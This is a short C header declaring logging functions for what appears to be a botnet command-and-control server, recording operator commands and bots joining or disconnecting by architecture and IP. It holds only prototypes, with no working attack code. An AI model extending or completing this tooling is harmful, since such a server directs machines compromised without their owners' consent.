// language: C, file: headers/logger.h
#ifndef LOGGER_H
#define LOGGER_H

#ifdef __cplusplus
extern "C" {
#endif

void log_command(const char* user, const char* ip, const char* command);
void log_bot_join(const char* arch, const char* ip, const char* group);
void log_bot_disconnected(const char* ip, const char* arch, const char* cause);

/* Re-read options/settings.txt at runtime. Call after editing the file
   if you don't want to restart the C2. Thread-safe. */
void log_settings_reload(void);

#ifdef __cplusplus
}
#endif

#endif /* LOGGER_H */